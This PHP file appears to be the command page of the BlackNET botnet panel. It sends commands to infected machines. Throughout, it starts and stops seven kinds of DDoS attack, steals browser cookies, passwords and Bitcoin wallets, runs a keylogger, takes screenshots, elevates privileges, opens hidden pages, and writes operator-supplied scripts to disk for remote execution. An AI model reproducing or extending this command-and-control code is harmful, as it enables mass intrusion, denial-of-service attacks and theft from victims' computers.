<?php
include_once 'session.php';
include_once 'classes/Clients.php';

function POST($file_name,$data){
    $data = isset($data) ? $data : "This is incorrect";
    $myfile = fopen($file_name, "w") or die("Unable to open file!");
    fwrite($myfile, $data);
    fclose($myfile);
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <?php include_once 'components/meta.php'; ?>
    <title>BlackNET - Execute Command</title>
    <?php include_once 'components/css.php'; ?>
    <style type="text/css">
    </style>
  </head>
  <body id="page-top">
    <?php include_once 'components/header.php'; ?>
    <div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">Command Menu</a>
            </li>
          </ol>
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas fa-bolt"></i>
              Command Menu
            </div>
            <div class="card-body">
              <form method='POST'>
                <div class="container container-special">
<?php

        if ($csrf != $_POST['csrf']) {
            echo '
            <div class="alert alert-danger">
                <span class="fa fa-times-circle"></span> CSRF Token is invalid.
            </div>
            ';
            die();
        }

        echo '<input type="text" value="' . $_POST['csrf'] . '" name="csrf" hidden />';
        $client = new Clients;
        if (isset($_POST['Form1'])) {
            $clientHWD = isset($_POST['client']) ? implode(',', $_POST['client']) : null;
        } elseif (isset($_POST['clients'])) {
            $clientHWD = $_POST['clients'];
        } else {
            echo '<div class="alert alert-danger"><span class="fa fa-times-circle"></span> You did not select a client to execute this command
                 <br> Please go back and choose a client. <br> <a href="index.php">BLACKNET Main Interface</a></div>';
            die(); 
        }


        $command = isset($_POST['command']) ? $_POST['command'] : "nocommand";
        echo '
            <input type="text" value="' . $command . '" name="command" hidden />';
        echo '
            <input type="text" value="' . $clientHWD . '" name="clients" hidden />';

        switch ($command){
            case "nocommand":
              echo '<div class="alert alert-danger"><span class="fa fa-times-circle"></span> You did not select a command to execute on the target deveice 
         <br> Please go back and choose a command. <br> <a href="index.php">BLACKNET Main Interface</a></div>';
               break;

            case "uninstall":
                Send($clientHWD, "Uninstall");
                echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Client Has Been Removed</div>';
            break;

            case "ddosw":
                if (isset($_POST['Form2'])){
                    if ($_POST['attacktype'] == "UDP Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|UDPAttack|BN|" . gethost($_POST['TargetURL']) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
                    }

                    if ($_POST['attacktype'] == "TCP Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|TCPAttack|BN|".gethost($_POST['TargetURL']) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);

                    }

                    if ($_POST['attacktype'] == "ARME Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|ARMEAttack|BN|" . gethost($_POST['TargetURL']) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
                    }

                    if ($_POST['attacktype'] == "Slowloris Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|SlowlorisAttack|BN|" . gethost($_POST['TargetURL']) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
                    }

                    if ($_POST['attacktype'] == "PostHTTP Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|PostHTTPAttack|BN|" . gethost($_POST['TargetURL']) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
                    }
                    
                    if ($_POST['attacktype'] == "HTTPGet Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|HTTPGetAttack|BN|" . gethost($_POST['TargetURL']) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
                    }

                    if ($_POST['attacktype'] == "BandwidthFlood Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|BWFloodAttack|BN|" . gethost($_POST['TargetURL']) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
                    }     
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                }
                menu("ddos_attack");
                break;

                case 'stopddos':
                  if (isset($_POST['Form2'])){
                    if ($_POST['attacktype'] == "UDP Attack")
                    {
                        Send($clientHWD, "StopDDOS|BN|UDPAttack");
                    }

                    if ($_POST['attacktype'] == "TCP Attack")
                    {
                        Send($clientHWD, "StopDDOS|BN|TCPAttack");

                    }

                    if ($_POST['attacktype'] == "ARME Attack")
                    {
                        Send($clientHWD, "StopDDOS|BN|ARMEAttack");
                    }

                    if ($_POST['attacktype'] == "Slowloris Attack")
                    {
                        Send($clientHWD, "StopDDOS|BN|SlowlorisAttack");
                    }

                    if ($_POST['attacktype'] == "PostHTTP Attack")
                    {
                        Send($clientHWD, "StopDDOS|BN|PostHTTPAttack");
                    }

                    if ($_POST['attacktype'] == "HTTPGet Attack")
                    {
                        Send($clientHWD, "StopDDOS|BN|HTTPGetAttack");
                    }

                    if ($_POST['attacktype'] == "BandwidthFlood Attack")
                    {
                        Send($clientHWD, "StopDDOS|BN|BWFloodAttack");
                    }                    
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                }
                menu("stop_ddos");
                break;
                
            case "uploadf":

                if (isset($_POST['Form2']))
                {
                    Send($clientHWD, "UploadFile|BN|" . $_POST['FileURL'] . "|BN|" . $_POST['Name']);
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                }
                menu("upload");
                break;

            case "update":

                if (isset($_POST['Form2']))
                {
                    Send($clientHWD, "UpdateClient|BN|" . $_POST['FileURL']);
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                }
                menu("update_client");
                break;

            case "ping":
                Send($clientHWD, "Ping");
                echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                break;

            case "msgbox":
                if (isset($_POST['Form2']))
                {
                    Send($clientHWD, "ShowMessageBox|BN|" . $_POST['Content'] . "|BN|" . $_POST['MessageTitle'] . "|BN|" . $_POST['msgicon'] . "|BN|" . $_POST['msgbutton']);
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                }
                menu("messagebox");
                break;

            case "openwp":
                if (isset($_POST['Form2']))
                {
                    Send($clientHWD, "OpenPage|BN|" . $_POST['Weburl']);
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                }
                menu("openpage");

                break;

            case "openhidden":
                if (isset($_POST['Form2']))
                {
                    Send($clientHWD, "OpenHidden|BN|" . $_POST['Weburl']);
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                }
                menu("openpage");
                break;

            case "close":
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                    $client->updateStatus($clientHWD,"Offline");
                    Send($clientHWD, 'Close');
                break;

            case "moveclient":
                if (isset($_POST['Form2']))
                {
                    Send($clientHWD, "MoveClient|BN|" . $_POST['newHost']);
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                }
                menu("move_bot");           
                break;

            case "blacklist":
            echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Client Has Been Blocked</div>';
                Send($clientHWD, 'Blacklist');
                break;

            case 'tkschot':
                echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                Send($clientHWD, 'Screenshot');
                break;

            case 'stealcookie':
                  echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                  Send($clientHWD, 'StealCookie');
                break;

            case 'stealchcookie':
                  echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                  Send($clientHWD, 'StealChCookies');
                break;

            case 'stealps':
                 echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                 Send($clientHWD, 'InstalledSoftwares');
                break;

           case 'startkl':
               echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
               Send($clientHWD, 'StartKeylogger');
               break;

            case 'stopkl':
                echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                Send($clientHWD, 'StopKeylogger');
                break;

                case 'getlogs':
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                    Send($clientHWD, 'RetriveLogs');
                    break;

                case 'stealpassword':
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                    Send($clientHWD,"StealPassword");
                    break;

                case "stealbtc":
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                    Send($clientHWD,"StealBitcoin");
                	break;

                case 'exec':
                        if (isset($_POST['Form2']))
                        {
                            $file_name = "scripts/" . $_POST['file_name'];
                            $data = $_POST['data'];
                            POST($file_name,$data);
                            
                            Send($clientHWD, "ExecuteScript|BN|" . $_POST['scriptType'] . "|BN|" . $_POST['file_name']);
                            echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                        }
                        menu("execute");  
                    break;

                case 'logoff':
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                    Send($clientHWD, 'Logoff');
                    break;

                case 'restart':
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                    Send($clientHWD, 'Restart');
                    break;

                case 'shutdown':
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                    Send($clientHWD, 'Shutdown');
                    break;

                case 'elev':
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                    Send($clientHWD, 'Elevate');
                    break;

                case 'restart':
                    echo '<div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div>';
                    Send($clientHWD, 'Restart');
                    break;

                default:
                    echo '<div class="alert alert-danger"><span class="fa fa-times-circle"></span> Incorrect Command !!</div>';
                    break;
            }

        function Send($USER, $Command){
            try {
                $client = new Clients;
                $client->updateCommands($USER, base64_encode(sanitizeInput($Command))); 
            } catch (Exception $e) {
                die($e->getMessage());
            }
        }

        function menu($menu_name){
            include_once "menus/".$menu_name.".html";
        }

        function gethost($url){
            $input = trim($url,"/");
            if(!preg_match("#^http(s)?://#", $input)){
                $input = "http://" . $input;
            }
            $urlParts = parse_url($input);
            $domain = preg_replace("/^www\./", '', $urlParts['host']);
            return gethostbyname($domain);
        }

        function sanitizeInput($value){
            $data = trim($value);
            $data = strip_tags($data);
            $data = htmlentities($data);
            $data = htmlspecialchars($data,ENT_QUOTES,'UTF-8');
            $data = filter_var($data,FILTER_SANITIZE_STRING);
            return $data;
        }

?>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>

    <?php include_once 'components/footer.php'; ?>
    
    <?php include_once 'components/js.php'; ?>

  </body>
</html>